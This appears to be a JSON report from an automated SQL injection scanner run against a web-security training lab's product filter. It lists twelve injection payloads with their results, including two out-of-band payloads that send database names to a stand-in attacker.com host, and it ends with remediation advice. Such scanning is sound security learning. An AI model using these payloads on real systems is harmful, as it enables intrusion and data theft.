@@ -1,0 +1,146 @@
+{
+  "target_url": "https://0ad7007f03bad2b981f96bb500f900b7.web-security-academy.net/filter?category=Corporate+gifts",
+  "assessment_summary": {
+    "total_parameters_tested": 1,
+    "vulnerable_parameters": 1,
+    "total_injection_tests": 12,
+    "successful_injections": 4,
+    "confidence_score": 0.825,
+    "risk_level": "CRITICAL"
+  },
+  "vulnerable_parameters": [
+    "category"
+  ],
+  "successful_injections": [
+    {
+      "parameter": "N/A",
+      "payload": "' OR '1'='1",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' OR 1=1--",
+      "type": "boolean_based",
+      "confidence": 0.7,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "resources, labheader, academyLabHeader, stylesheet, resources",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "resources, labheader, academyLabHeader, stylesheet, resources",
+      "error_message": null
+    }
+  ],
+  "recommendations": [
+    "CRITICAL: SQL injection vulnerabilities detected!",
+    "Immediate action required to secure the application",
+    "Use parameterized queries or prepared statements",
+    "Implement input validation and sanitization",
+    "Consider using an ORM framework"
+  ],
+  "technical_details": {
+    "discovered_parameters": [
+      "category"
+    ],
+    "all_test_results": [
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 1.0501656532287598,
+        "confidence": 0.7
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": true,
+        "response_time": 1.1293771266937256,
+        "confidence": 0.7
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 2.967911720275879,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.9392116069793701,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.000246524810791,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1945793628692627,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0043973922729492,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0543920993804932,
+        "confidence": 0.95
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 0.9469051361083984,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1605591773986816,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.0504982471466064,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 2.331242561340332,
+        "confidence": 0.0
+      }
+    ]
+  }
+}
